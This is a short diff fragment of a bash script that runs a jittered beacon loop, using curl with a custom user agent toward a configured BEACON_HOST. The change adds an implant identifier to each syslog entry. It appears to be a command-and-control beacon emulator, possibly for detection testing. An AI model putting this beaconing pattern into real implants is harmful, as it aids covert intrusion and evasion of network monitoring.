@@ -57,7 +57,7 @@ while [[ $count -lt $MAX_BEACONS ]]; do
   next_sleep=$(( BEACON_INTERVAL + jitter_val ))
   next_sleep=$(( next_sleep < 5 ? 5 : next_sleep ))
 
-  logger -t "$TAG" "BEACON:${count}/${MAX_BEACONS} ts=${ts} next_in=${next_sleep}s dst=${BEACON_HOST}"
+  logger -t "$TAG" "BEACON:${count}/${MAX_BEACONS} ts=${ts} next_in=${next_sleep}s dst=${BEACON_HOST} implant_id=${implant_id}"
 
   http_code=$(curl -s -o /dev/null -w "%{http_code}" \
     -A "$ua" \
